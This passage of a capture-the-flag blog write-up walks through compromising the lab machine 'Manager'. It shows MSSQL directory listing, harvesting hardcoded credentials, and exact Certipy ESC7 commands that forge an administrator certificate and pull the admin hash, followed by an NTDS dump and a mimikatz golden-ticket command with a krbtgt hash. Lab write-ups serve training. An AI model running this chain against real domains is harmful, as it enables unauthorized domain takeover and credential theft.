+<li>
+<p><strong>I check if our credentials are valid for the MSSQL service running &amp; they appear to be</strong>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-150252_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>I connect using</strong> <code>impacket-mssqlclient</code>:</p>
+<ul>
+<li><code>sudo impacket-mssqlclient manager.htb/$user:$user@$box -windows-auth</code></li>
+<li><figure><img src="/ox-hugo/2024-09-21-151242_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I go for the easy win of trying to enable <code>xp_cmdshell</code> so we can run commands on the underlying OS but alas we do not have required perms:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-151736_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I also try running <code>xp_dirtree</code> to see if I can read files on the underlying OS</p>
+<ul>
+<li>
+<p><code>EXEC xp_dirtree 'C:\', 1, 1;</code></p>
+<ul>
+<li><strong>We get a hit!</strong>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-154502_.png">
+</figure>
+</li>
+<li>This means we can read files &amp; folders on the underlying OS &amp; there are some interesting folders here already:
+<ul>
+<li><code>inetpub</code> (webserver)</li>
+<li><code>Recovery</code> (potentially backups)</li>
+<li><code>SQL2019</code> (it&rsquo;s in the name….)</li>
+<li><code>Users</code> (….really?)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>What is xp_dirtree?</strong></p>
+<ul>
+<li><code>xp_dirtree</code> is a built-in SQL Server stored procedure that lets us list the contents of a directory—whether that’s subfolders, files, or both—without leaving the comfort of SQL. We tell it which folder to start with, how deep to go, and whether we want to see files in addition to folders.
+<ul>
+<li>
+<p><strong>Breaking down the command</strong>:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>      <span style="color:#66d9ef">EXEC</span> xp_dirtree <span style="color:#e6db74">&#39;C:\&#39;</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>;</span></span></code></pre></div>
+    
+</div>
+<ul>
+<li><code>C:</code>: This is the starting point—the directory we want to look into. In this case, we’re starting at the root of the C: drive.</li>
+<li><code>1</code> (depth): This tells <code>xp_dirtree</code> to only look in the top-level folder, without diving into subdirectories. We can increase this number if we want to see deeper levels. E.G. <code>2</code> etc.</li>
+<li><code>1</code> (file flag): This tells SQL Server to include both files and directories in the result. If you set this to 0, it will only list directories.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="finding-a-website-backup">Finding a website backup:</h4>
+<ul>
+<li>
+<p>I find a website backup in <code>C:\inetpub\wwwroot</code></p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-155652_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>As this backup is in the actual webroot itself we should be able to retrieve it via <code>wget</code></p>
+<ul>
+<li>I download it:</li>
+<li><figure><img src="/ox-hugo/2024-09-21-161131_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="finding-hard-coded-credentials">Finding Hard-coded Credentials:</h3>
+<ul>
+<li>
+<p>I expand the zip file and immediatley see a file called <code>.old-conf.xml</code>:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-161238_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I find hardcoded creds for the user <code>Raven</code> in the file:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-161350_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>I verify these work with netexec:</p>
+<ul>
+<li><code>netexec smb $box -u $user -p $pass --shares</code></li>
+<li><figure><img src="/ox-hugo/2024-09-21-161705_.png">
+</figure>
+</li>
+<li>Again we see that Raven has access to the same shares as the operator user.</li>
+</ul>
+</li>
+</ul>
+<h3 id="getting-access-to-the-system-as-raven">Getting access to the system as Raven:</h3>
+<ul>
+<li>
+<p>I access the host using evil-winrm as Raven:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-163210_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>User flag:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-163346_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="3-dot-privilege-escalation">3. Privilege Escalation:</h2>
+<h3 id="privesc-enumeration">Privesc Enumeration:</h3>
+<ul>
+<li>
+<p>I run <code>WinPEAS</code> and don&rsquo;t get anything too interesting.</p>
+</li>
+<li>
+<p>I upload <code>SharpHound.exe</code> via evil-winrm and run a collection:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-185534_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>Looking at our owned users, we can see that <code>Raven</code> has the <code>Enroll</code> edge/connection to the certificate authority <code>MANAGER-DC01-CA@MANAGER.HTB</code>:</p>
+</li>
+<li>
+<p><strong>Enroll Edge Abuse</strong>:</p>
+<ul>
+<li>
+<p>In bloodhound it does not show us a specific attack path we can take:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-190109_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>
+<p>However looking at the bloodhound knowledge base for enroll it tells us the following:</p>
+<blockquote>
+<p>The Enroll permission grants enrollment rights on the certificate template.</p>
+<p>The following additional requirements must be met for a principal to be able to enroll a certificate:</p>
+<ol>
+<li>The certificate template is published on an enterprise CA</li>
+<li>The principal has Enroll permission on the enterprise CA</li>
+<li>The principal meets the issuance requirements and the requirements for subject name and subject alternative name defined by the template</li>
+</ol>
+</blockquote>
+</li>
+<li>
+<p>It also links us to the article <a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">Certified_Pre-Owned</a></p>
+</li>
+<li>
+<p>So from what I can tell this is abuse of the CA as a means to privesc.</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="ca-abuse-to-privesc">CA Abuse to Privesc:</h3>
+<ul>
+<li>
+<p>I use <a href="https://github.com/ly4k/Certipy">Certipy</a> to enumerate for vulnerabilities</p>
+<ul>
+<li><code>certipy-ad find -vulnerable -u $user@manager.htb -p $pass -dc-ip $box</code></li>
+</ul>
+</li>
+<li>
+<figure><img src="/ox-hugo/2024-09-21-190643_.png">
+</figure>
+
+<ul>
+<li>I did import it into bloodhound, but I&rsquo;ll be honest, I wasn&rsquo;t sure what extra it gave me &amp; as I am running bloodhound in docker I did not add the extra queries.</li>
+</ul>
+</li>
+<li>
+<p>Looking at the output I can see that Raven has dangerous permissions:</p>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-192201_.png">
+</figure>
+
+<ul>
+<li>
+<p>We can see that the attack path we can take is <code>ESC7</code></p>
+<blockquote>
+<p>ESC7 is when a user has the Manage CA or Manage Certificates access right on a CA. There are no public techniques that can abuse the Manage Certificates access right for domain privilege escalation, but it can be used it to issue or deny pending certificate requests</p>
+</blockquote>
+</li>
+<li>
+<p>This means that she has the <code>ManageCA</code> rights over the <code>CA</code> and but utilzing the <code>ESC7</code> scenario we can elevate our privileges to <code>Domain Admin</code>. We just need to follow the steps as outlined on <a href="https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7">https://github.com/ly4k/Certipy?tab=readme-ov-file#esc7</a>:</p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>ESC7 Attack Process Overview (simplified)</strong>:</p>
+<ol>
+<li>
+<p><strong>Permissions Setup/Make ourselves an</strong> <code>officer</code> <strong>on the</strong> <code>CA</code>:</p>
+<ul>
+<li>As we have the <code>ManageCA</code> permission on the Windows domain Certificate Authority (<code>CA</code>). We can also grant ourselves the <code>Manage Certificates permission</code> (using the <code>ManageCA</code> permission).</li>
+<li>We can add ourselves as an <code>officer</code> with <code>Manage Certificates permission</code>.</li>
+<li>This permission gives us control to handle certificate requests and issue certificates, even failed ones (that last one is important!)</li>
+</ul>
+</li>
+<li>
+<p><strong>Vulnerable Certificate Template</strong>:</p>
+<ul>
+<li>The <code>SubCA</code> certificate template is vulnerable to exploitation.</li>
+<li>If it is disabled, we will use our new permissions as an <code>officer</code> to enable it on the <code>CA</code></li>
+</ul>
+</li>
+<li>
+<p><strong>Making the Certificate Request</strong>:</p>
+<ul>
+<li>We request a certificate using the <code>SubCA</code> template for an admin account (e.g., <code>administrator@manager.htb</code>).</li>
+<li>Our request will be denied, but we save the private key and note down the request ID.</li>
+</ul>
+</li>
+<li>
+<p><strong>Re-Issuing the Denied Request</strong>:</p>
+<ul>
+<li>Since we have Manage Certificates permission, we can issue the previously denied certificate request using the request ID.</li>
+</ul>
+</li>
+<li>
+<p><strong>Retrieving the Certificate</strong>:</p>
+<ul>
+<li>Finally, we retrieve the issued certificate and private key for the highly privileged account e.g. domain admin/admin.</li>
+</ul>
+</li>
+<li>
+<p><strong>Result</strong>:</p>
+<ul>
+<li>We now have a valid certificate for a privileged account, allowing us to impersonate that user and escalate our access.</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h4 id="step-1-add-raven-as-an-officer-to-manage-and-issue-certs">Step 1 Add Raven as an Officer, to manage &amp; issue certs:</h4>
+<ul>
+<li><code>certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -add-officer raven -debug</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-193249_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="step-2-enable-subca-template">Step 2 Enable <code>SubCA</code> template:</h4>
+<ul>
+<li>
+<p><strong>Enable SubCA Template</strong>:</p>
+<ul>
+<li><code>certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -enable-template SubCA -debug</code>
+<ul>
+<li>
+<figure><img src="/ox-hugo/2024-09-21-193513_.png">
+</figure>
+
+</li>
+<li>
+<p>The reason we do this is because:</p>
+<blockquote>
+<p>The SubCA certificate template is vulnerable to ESC1, but only administrators can enroll in the template. Thus, a user can request to enroll in the SubCA - which will be denied - but then issued by the manager afterwards.</p>
+</blockquote>
+<ul>
+<li>I see this says <code>ESC1</code> however we are using this cert as only admins can enroll using this cert and we want to privesc to admin.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Verify the template has been enabled</strong>:</p>
+<ul>
+<li><code>certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -list-templates -debug</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-193614_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="step-3-request-a-certificate-on-behalf-of-the-administrator">Step 3 Request a certificate on behalf of the administrator:</h4>
+<ul>
+<li><strong>We request a certificate for the administrator, as expected it is denied</strong>:
+<ul>
+<li><code>certipy-ad req -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -template SubCA -upn administrator@manager.htb -debug</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-195727_.png">
+</figure>
+</li>
+<li>We opt to save it anyway &amp; take a note of the number listed <code>23</code></li>
+<li>This is the most important part of this whole process. We are setting the <code>UPN</code> (User Principal Name) to be <code>administrator@manager.htb</code> this means we are requesting this ticket on behalf of the <code>administrator</code> user.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="step-4-re-issue-our-failed-cert">Step 4 Re-issue our failed cert:</h4>
+<ul>
+<li><strong>We re-issue our failed cert</strong>:
+<ul>
+<li><code>certipy-ad ca -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -issue-request 23 -debug</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-195847_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="step-5-retrieve-the-issued-cert-and-download-as-dot-pfx">Step 5 Retrieve the issued cert and download as <code>.pfx</code>:</h4>
+<ul>
+<li><strong>We request our re-issued cert and download it</strong>:
+<ul>
+<li><code>certipy-ad req -u $user@manager.htb -p $pass -dc-ip $box -ca manager-dc01-ca -retrieve 23 -debug</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-200201_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="step-6-retrieve-the-admin-hash">Step 6 Retrieve the Admin Hash:</h4>
+<ul>
+<li>
+<p><strong>Sync your clock first</strong>:</p>
+<ul>
+<li>
+<p>For the love all that is HOLY do this before you progress any further!!</p>
+<ul>
+<li>Sync your Kali/attack host clock with the box. The reason is if you do not, kerberos will be unhappy and not let you progress. This is a security mechanism.
+<ul>
+<li>If you see the below error this is most likely down to your attack host clock being too out of sync with the target.
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-201233_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>If you are on kali do the following</strong>:</p>
+<ul>
+<li><code>sudo apt install ntpdate</code></li>
+<li>Ensure that you have the host in your <code>/etc/hosts</code> file &amp; then run: <code>sudo ntpdate -s manager.htb</code> this will sync your clocks.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Retrieve Admin Hash!</strong>:</p>
+<ul>
+<li><code>certipy-ad auth -pfx administrator.pfx</code>
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-201449_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="attack-deep-dive-e-dot-g-dot-exploiting-upns-in-esc7-attacks-a-hacker-s-guide">Attack Deep-Dive e.g. Exploiting UPNs in ESC7 Attacks: A Hacker&rsquo;s Guide:</h3>
+<ul>
+<li>
+<p><strong>What&rsquo;s a UPN and Why Do We Care?</strong></p>
+<ul>
+<li>First things first: <code>UPN</code> stands for User Principal Name (UPN). They&rsquo;re commonly used when issuing certificates from a Microsoft Certificate Authority (CA) for user authentication. Here&rsquo;s why they&rsquo;re so important:
+<ol>
+<li>They represent identity in certificates, usually in the Subject Alternative Name (SAN) extension.</li>
+<li>They link certificates to specific Active Directory accounts.</li>
+<li>They enable certificate mapping for authentication.</li>
+<li>They facilitate Single Sign-On (SSO) scenarios.</li>
+<li>They&rsquo;re used in smart card logons.</li>
+<li>Sometimes, they even correspond to email addresses.</li>
+</ol>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>The ESC7 Attack: Our Ticket to Domain Admin</strong>:
+The ESC7 attack path all revolves around a misconfigured certificate template.</p>
+<ol>
+<li>
+<p>We find a template that lets us specify our own Subject Alternative Name (SAN) when requesting a certificate. <code>SubCA</code></p>
+</li>
+<li>
+<p>We request a certificate and we specify a UPN of a high-privileged account (like a domain admin) in the certificate&rsquo;s SAN field.</p>
+</li>
+<li>
+<p>The CA will issue us a certificate with our specified UPN, even though it doesn&rsquo;t match our actual identity.</p>
+</li>
+<li>
+<p>Now we can authenticate as admin:</p>
+</li>
+</ol>
+</li>
+<li>
+<p><strong>From Certificate to Domain Domination</strong>:</p>
+</li>
+</ul>
+<p>But wait, you might ask, &ldquo;Bloodstiller, how do we actually use this certificate to own the domain?&rdquo; Great question! Here&rsquo;s how we turn our shiny new cert into total control:</p>
+<ol>
+<li>
+<p>We present our manipulated certificate to the target system (usually a domain controller).</p>
+</li>
+<li>
+<p>The system checks the cert: Is it valid? Not expired? Issued by a trusted CA?</p>
+<ul>
+<li>As we have power to issue certs, it&rsquo;s valid - check.</li>
+<li>We just issued it - check.</li>
+<li>As CA&rsquo;s be default trust certs issues by themselves - check!</li>
+</ul>
+</li>
+<li>
+<p>Here&rsquo;s where the magic happens: the DC/System extracts the <code>UPN</code> (which we set) from the <code>SAN</code> field of our certificate.</p>
+</li>
+<li>
+<p>It uses this <code>UPN</code> to find the corresponding user account in Active Directory. Remember, this is the admin account we specified, not our actual account!</p>
+</li>
+<li>
+<p>If everything looks good (and why wouldn&rsquo;t it?), the system hands us a Kerberos Ticket Granting Ticket (<code>TGT</code>) for that account.</p>
+</li>
+<li>
+<p>Boom! We now have a TGT for a high-privileged account. We can use this ticket to access resources and wreak havoc with admin privileges.</p>
+<ul>
+<li><strong>Note</strong>: Certipy extracts this the admin hash from TGT and presents us with it as well as saving the TGT as a <code>.cacche</code> file so we can then perform PTT attacks from the comfort of our attack box.</li>
+</ul>
+</li>
+</ol>
+<!-- raw HTML omitted -->
+<ul>
+<li><strong>Why This Attack is a Hacker&rsquo;s Dream</strong>:
+<ul>
+<li>It bypasses multi-factor authentication (MFA)!!!</li>
+<li>No account lockouts to worry about.</li>
+<li>It&rsquo;s stealthy - often not logged as clearly as failed password attempts.</li>
+<li>All our actions look like they&rsquo;re coming from the real admin account.</li>
+</ul>
+</li>
+</ul>
+<h2 id="4-dot-ownership">4. Ownership:</h2>
+<ol>
+<li>
+<ul>
+<li><strong>I login as the admin using their hash</strong>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-201828_.png">
+</figure>
+</li>
+<li><figure><img src="/ox-hugo/2024-09-21-201955_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="5-dot-persistence">5. Persistence:</h2>
+<ul>
+<li>
+<p>My original plan was to craft a golden ticket however for whatever reason it would not work, I tried numerous ways with mimikatz, ruebeus etc but it would always give me the error:</p>
+<ul>
+<li><code>[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)</code> it may just be that this host is set to detect Golden Ticket abuse. I did consider doing a diamond exploit, however I need to look more into the process.</li>
+</ul>
+</li>
+<li>
+<p>I have persistence via the hashes of the users below:</p>
+<ul>
+<li>I dump the NTDS db so I can retrieve the <code>krbtgt</code> account hash
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-21-202305_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="process-of-failed-golden-ticket-attack">Process of failed Golden Ticket Attack:</h3>
+<ul>
+<li>In-case anyone can see any glaring issues. If you can hit me up on <code>bloodstiller at proton.me</code> &amp; tell me why I am dumb please.
+<ol>
+<li>Upload <code>nc.exe</code> &amp; <code>mimikatz</code> via existing administrator evil-winrm session</li>
+<li>Sync host clock with target clock (this is important!)</li>
+<li>Start reverse shell:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-22-093019_.png">
+</figure>
+
+<ul>
+<li>If anyone is wondering why I am creating a reverse shell when I have an <code>evil-winrm</code> shell, it&rsquo;s because mimikatz does not play nice with <code>evil-winrm</code>.</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Request golden ticket
+<ul>
+<li><code>kerberos::golden /domain:manager.htb /user:administrator /sid:S-1-5-21-4078382237-1492182817-2568127209-500 /krbtgt:b5edce70e6c1efa075f14bcf5231f79a</code></li>
+<li><figure><img src="/ox-hugo/2024-09-22-093043_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Download ticket.kirbi
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-22-093105_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Convert <code>ticket.kirbi</code> to <code>.cacche</code> for use on linux.
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-22-093121_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Import <code>.ccache</code> file into <code>KRB5CCNAME</code> variable
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-22-093134_.png">
+</figure>
+</li>
+</ul>
+</li>
+<li>Run klist to ensure ticket is imported variable.
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-22-093207_.png">
+</figure>
+
+<ul>
+<li>As we can see this ticket is valid for 10 years:
+<ul>
+<li>I also tried appending the specific user SID for admin of <code>500</code> &amp; also using a lower-case <code>administrator</code>.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Run <code>impacket-psexec</code>:
+<ul>
+<li><figure><img src="/ox-hugo/2024-09-22-093219_.png">
+</figure>
+</li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<h2 id="lessons-learned">Lessons Learned:</h2>
+<h3 id="what-did-i-learn">What did I learn?</h3>
+<ol>
+<li>I learned alot about certificate attacks, I had done very little on them previously so this was nice to get done.</li>
+<li>I learned about golden ticket attacks being thwarted……</li>
+</ol>
+<h3 id="what-silly-mistakes-did-i-make">What silly mistakes did I make?</h3>
+<ol>
+<li>Enclosing my user &amp; password vars in quotations marks rendering them USELESS! We live and learn</li>
+<li>The standard not updating <code>/etc/hosts</code> when doing LDAP queries etc.</li>
+<li>Oh here is a fun one, I spent a good amount of time trying to exfil the website backup before realizing it was in-fact in the webroot and I could just <code>wget</code> it.</li>
+</ol>
+<h2 id="sign-off">Sign off:</h2>
+<p>Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!</p>
+<p>Until next time, hack the planet!</p>
+<p>– Bloodstiller</p>
+<p>– Get in touch bloodstiller at proton dot me</p>
+
+            
+        </div>
+    </article>
+
+        </main>
+
+        <footer class="footer">
+    <div class="footer-left">
+        <ul class="social">
+            
+                <li>All Rights Reserved ®.</li>
+            
+
+            
+                <li>Bloodstiller</li>
+            
+
+            
+                
+            
+                
+            
+                
+                    <li>
+                        
+                            <a href="https://github.com/bloodstiller" target="_blank">
+                                <i class="bi-github"></i>
+                            </a>
+                        
+
+                    </li>
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+                
+            
+        </ul>
+    </div>
+
+    <div class="footer-right">
+        <ul class="control status clearfix">
+            
+                <li>
+                    
+                        Word Count:
+                        3643
+                    
+                </li>
+            
+
+            
+            
+
+            
+                <li>en</li>
+            
+
+            
+                <li>
+                    <a href="https://gohugo.io" class="btn" target="_blank"
+                        >Hugo: 0.134.3</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    <a
+                        href="https://github.com/JingWangTW/dark-theme-editor"
+                        class="btn"
+                        target="_blank"
+                        >Theme: dark-theme-editor</a
+                    >
+                </li>
+            
+
+            
+                <li>
+                    
+                        Last modified: &nbsp;
+                        <time>
+                            Jan 01 0001 00:00:00
+                        </time>
+                    
+                </li>
+            
+
+            
+                <li title="">
+                    
+                </li>
+            
+        </ul>
+    </div>
+</footer>
+
+    </body>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/codeblock_copy.c59588ba3a219dafab515508b0bcd2d0592dc9e0e08de20dc1983bfd8cb69d03d37c78eadd81ee7bef724570f9e4286d9ea1c53ca59d3711c0bcad9e9134d0e9.js"
+            integrity="sha512-xZWIujohna&#43;rUVUIsLzS0FktyeDgjeINwZg7/Yy2nQPTfHjq3YHue&#43;9yRXD55ChtnqHFPKWdNxHAvK2ekTTQ6Q=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/dir_toggle.e6f8c63f3ed9aefa9cedb3be3d5ab67e00bc3cf87a8dd7ef1ed55d642e9a7d80837636a26ae77f967f2aa74a44ae70c4134e25abca587f048c60807ba9e9c82f.js"
+            integrity="sha512-5vjGPz7Zrvqc7bO&#43;PVq2fgC8PPh6jdfvHtVdZC6afYCDdjaiaud/ln8qp0pErnDEE04lq8pYfwSMYIB7qenILw=="></script>
+    
+        
+        <script
+            type="text/javascript"
+            src="/_theme/js/sidebar.01b59c615736643387108a100de70c51d5e98477bdc338244a87d37f7e38286b48683459eade68087f0688f0235e7a48691e633954fa930d41823e9ddf797085.js"
+            integrity="sha512-AbWcYVc2ZDOHEIoQDecMUdXphHe9wzgkSofTf344KGtIaDRZ6t5oCH8GiPAjXnpIaR5jOVT6kw1Bgj6d33lwhQ=="></script>
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link
+    rel="stylesheet"
+    href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" />
+
+
+
+
+</html>
